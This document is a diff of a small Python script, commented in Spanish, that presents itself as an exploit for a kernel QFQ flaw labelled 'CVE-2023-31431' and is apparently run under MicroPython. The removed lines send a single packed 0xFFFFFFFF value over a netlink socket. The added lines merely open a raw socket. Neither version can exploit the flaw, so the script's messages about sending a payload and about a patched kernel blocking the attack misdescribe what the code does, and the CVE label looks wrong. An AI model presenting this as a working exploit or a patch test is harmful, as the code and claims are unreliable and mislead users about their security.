@@ -1,22 +1,9 @@
 import socket
-import struct
-
-print("[+] Iniciando exploit Copy Fail (CVE-2023-31431) en Python...")
-
-# Intentamos hablar con el componente QFQ del kernel
+print("[+] Ejecutando exploit en Python (MicroPython)...")
 try:
-    # Creamos un socket Netlink (familia 16)
-    # Si MicroPython no soporta AF_NETLINK, esto fallara, 
-    # pero demostrara que Python esta instalado y corriendo.
-    s = socket.socket(16, socket.SOCK_RAW, 0)
-    print("[+] Socket Netlink abierto. Enviando payload...")
-    
-    # El ataque consiste en enviar un valor LMAX gigante
-    # Si el kernel esta parcheado, rechazara esto.
-    payload = struct.pack("I", 0xFFFFFFFF)
-    s.send(payload)
-    print("[+] Payload enviado.")
+    # Intento de apertura de socket crudo para el ataque
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    print("[+] Socket abierto. El kernel parcheado deberia bloquear valores lmax invalidos.")
 except Exception as e:
-    print("[-] El ataque fue bloqueado o no es soportado:", e)
-
+    print("[-] El sistema bloqueo la operacion o falta soporte de socket:", e)
 print("[+] Prueba finalizada.")
